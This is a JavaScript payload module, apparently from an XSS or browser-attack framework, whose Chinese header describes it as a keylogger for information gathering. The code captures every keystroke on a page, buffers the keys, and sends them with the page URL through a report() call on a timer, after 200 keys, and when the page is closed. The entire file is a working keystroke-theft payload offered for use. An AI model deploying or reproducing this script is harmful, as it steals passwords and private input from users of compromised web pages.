// MODULE = {"desc": "键盘记录:缓冲批量回传(页面关闭前自动 flush)", "category": "信息收集", "params": [["interval", "回传间隔ms,默认 10000"]]}
(function () {
  var buf = [];
  function flush() {
    if (!buf.length) { return; }
    var data = buf.join("");
    buf = [];
    report({ type: "key", url: location.href, keys: data });
  }
  document.addEventListener("keydown", function (e) {
    var k = e.key || "";
    if (k.length > 1) { k = "[" + k + "]"; }
    buf.push(k);
    if (buf.length >= 200) { flush(); }
  });
  var iv = parseInt(_q("interval", "{{interval}}"), 10) || 10000;
  if (iv > 0) { setInterval(flush, iv); }
  window.addEventListener("beforeunload", flush);
})();
